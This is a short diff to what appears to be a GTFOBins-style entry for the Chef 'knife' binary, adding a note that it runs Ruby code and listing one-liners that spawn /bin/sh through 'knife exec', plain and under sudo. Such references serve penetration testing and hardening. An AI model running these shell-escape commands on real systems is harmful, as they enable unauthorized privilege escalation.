@@ -1,8 +1,10 @@
 ---
+description: This is capable of running [`ruby`](/gtfobins/ruby/) code.
 functions:
-  sudo:
-    - description: Running /bin/sh via Ruby's exec function.
+  shell:
     - code: |
-        sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
-
+        knife exec -E 'exec "/bin/sh"'
+  sudo:
+    - code: |
+        sudo knife exec -E 'exec "/bin/sh"'
 ---
